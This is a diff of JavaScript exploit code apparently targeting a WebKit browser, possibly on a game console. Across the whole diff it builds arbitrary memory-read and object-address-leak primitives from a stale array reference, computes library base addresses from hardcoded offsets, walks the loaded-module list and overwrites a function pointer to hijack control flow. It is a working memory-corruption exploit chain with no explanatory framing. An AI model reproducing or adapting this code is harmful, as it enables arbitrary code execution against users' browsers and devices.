@@ -35,7 +35,7 @@ function memdump(lo, hi, temp, size) {
 
 log('Loaded');
 
-var rwbuf = new ArrayBuffer(0x1001 * 4);
+var rwbuf = new ArrayBuffer(0x1003 * 4);
 var tu = new Uint32Array(rwbuf);
 for(var i = 0; i < tu.length; ++i)
 	tu[i] = ((i & 1) == 0) ? 0x41424344 : 0x41414141;
@@ -60,6 +60,10 @@ function allocBuffers() {
 }
 
 function paddr(lo, hi) {
+	if(arguments.length == 1) {
+		hi = lo[1];
+		lo = lo[0];
+	}
 	var slo = ('00000000' + lo.toString(16)).slice(-8);
 	var shi = ('00000000' + hi.toString(16)).slice(-8);
 	return '0x' + shi + slo;
@@ -77,24 +81,57 @@ function doExploit(buf, stale, temp) {
 		dump('Tem', temp, count);
 	}
 
-	function getBase() {
-		stale[1] = document.getElementById;
-		var lo = buf[6];
-		var hi = buf[7];
-		stale[1] = temp;
-		buf[4] = lo;
-		buf[5] = hi;
-		buf[6] = 128;
+	var func = document.getElementById;
+	func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
+	var funclo, funchi;
+	var funcbase = 0x835DC4; // This is the base address for getElementById in the webkit module
 
-		lo = temp[6];
-		hi = temp[7];
+	var leakee = {'b' : null};
+	var leaker = {'a' : leakee};
+	var leaklo, leakhi;
+
+	stale[1] = leaker;
+	var leaklo = buf[4], leakhi = buf[5];
+	stale[1] = temp;
+
+	function read4(lo, hi, off) {
+		if(arguments.length == 2) {
+			off = hi;
+			hi = lo[1];
+			lo = lo[0];
+		}
 		buf[4] = lo;
 		buf[5] = hi;
-		var lo = (((temp[4] - 0x835e5c) >>> 0) & 0xFFFFFFFF) >>> 0;
-		if(temp[4] < 0x835e5c)
-			hi = (temp[5] - 1) >>> 0;
+		buf[6] = 0xFFFFFFFF;
+
+		return temp[off];
+	}
+	function readAddr(lo, hi, off) {
+		if(arguments.length == 2) {
+			off = hi;
+			hi = lo[1];
+			lo = lo[0];
+		}
+		return [read4(lo, hi, off), read4(lo, hi, off + 1)];
+	}
+	function getAddr(obj) {
+		leakee['b'] = obj;
+		return [read4(leaklo, leakhi, 4), read4(leaklo, leakhi, 5)];
+	}
+
+	function getBase() {
+		var tlfuncaddr = getAddr(func);
+		var funcaddr = readAddr(tlfuncaddr, 6);
+		funclo = funcaddr[0];
+		funchi = funcaddr[1];
+
+		var lo = (((read4(funcaddr, 8) - funcbase) >>> 0) & 0xFFFFFFFF) >>> 0;
+		if(read4(funcaddr, 8) < funcbase)
+			hi = (read4(funcaddr, 9) - 1) >>> 0;
 		else
-			hi = temp[5] >>> 0;
+			hi = read4(funcaddr, 9) >>> 0;
+
+		log('First module ... ' + paddr(lo, hi));
 
 		return [lo, hi];
 	}
@@ -249,13 +286,17 @@ function doExploit(buf, stale, temp) {
 			
 			if(temp[temp[1] >> 2] == 0x30444f4d) {
 				log('Got MOD at 0x' + nrohi.toString(16) + ':0x' + nrolo.toString(16));
-				if(++ctr == 2)
+				if(temp[4] == 0x8DCDF8 && temp[5] == 0x959620) {
+					log('Found main module.');
+					return [nrolo, nrohi];
+				}
+				/*if(++ctr == 2)
 					while(true) {
 						log('Attempting write of page...');
 						memdump(nrolo, nrohi, temp, 4096 >> 2);
 						nrolo = (nrolo + 4096) >>> 0;
 						buf[4] = nrolo;
-					}
+					}*/
 			} else {
 				log('No valid MOD header.  Back at RTLD.');
 				break;
@@ -274,46 +315,67 @@ function doExploit(buf, stale, temp) {
 		}
 	}
 
-	function getSetFunc(func, nlo, nhi, off) {
-		off = off !== undefined ? off : 1;
-		eval('(function(x, o, v) { x[o] = v; })')(stale, off, func);
-		var lo = buf[6];
-		var hi = buf[7];
-		log('First addr ' + paddr(lo, hi));
-		eval('(function(x, o, v) { x[o] = v; })')(stale, off, temp);
+	function setjmp() {
+		var mainaddr = walkList();
+		var nlo = mainaddr[0], nhi = mainaddr[1];
+		log('Main module at ' + paddr(nlo, nhi));
+		var justret = 0x00433F78;
+		var setjmp  = 0x00433EE0;
+		var test = 0x0439DD8;
+		nlo = (((nlo + test) >>> 0) & 0xFFFFFFFF) >>> 0;
+		if(nlo < mainaddr[0])
+			nhi = (nhi + 1) >>> 0;
+		log('setjmp at ' + paddr(nlo, nhi));
+		log('Assigning function pointer');
+
+		var lo = funclo;
+		var hi = funchi;
+		log('Function object at ' + paddr(lo, hi));
 		buf[4] = lo;
 		buf[5] = hi;
 		buf[6] = 128;
 
-		lo = temp[4];
-		hi = temp[5];
-		log('Second addr ' + paddr(lo, hi));
-		buf[4] = lo;
-		buf[5] = hi;
+		lo = temp[8];
+		hi = temp[9];
 
-		dumptemp(64);
-		var foff = [0, 1];
-		lo = temp[foff[0]];
-		hi = temp[foff[1]];
-		//dumptemp(64);
-		if(nlo === undefined) {
-			log('Func addr ' + paddr(lo, hi));
-			return [lo, hi];
-		} else {
-			temp[foff[0]] = nlo;
-			temp[foff[1]] = nhi;
-			log('Patched function address from ' + paddr(lo, hi) + ' to ' + paddr(nlo, nhi));
-		}
+		temp[8] = (lo + (0x836050 - funcbase)) >>> 0;
+
+		var xlo = temp[8], xhi = temp[9];
+		log(paddr(xlo, xhi));
+		var t = {'a' : {}};
+		var taddr = getAddr(t);
+		log(paddr(taddr));
+		buf[4] = taddr[0];
+		buf[5] = taddr[1];
+		temp[0] = xlo;
+		temp[1] = xhi;
+		log('...');
+		var tobj = t['a'];
+		log('...');
+		//log(tobj);
+		log(paddr(readAddr(getAddr(tobj), 0)));
+		return;
+
+		//temp[8] = nlo;
+		//temp[9] = nhi;
+		//log('Patched function address from ' + paddr(lo, hi) + ' to ' + paddr(temp[8], temp[9]));
+
+		log('Assigned.  Jumping.');
+		alert('Trying to setjmp...');
+		var ret = func.apply(0x101);
+		log('Setjmp!');
+
+		log('After?');
+		log('...');
+
+		var saddr = getAddr(ret);
+		log(paddr(saddr));
+		/*buf[4] = saddr[0];
+		buf[5] = saddr[1];
+		dumpbuf(1024);*/
 	}
 
-	//walkList();
-	//var arr = new Array(1);
-	//arr[0] = 0xDEADBEEF >>> 0;
-	var func = document.getElementById;//getElementById.bind(document);
-	var addr = getSetFunc(func, 0, 0);
-	//getSetFunc(func);
-	alert('Trying to crash...')
-	log(func.apply(document, ['foo']).id);
+	setjmp();
 
 	/*buf[4] = lo = 0x492cb000 >>> 0;
 	buf[5] = hi = 0x60;
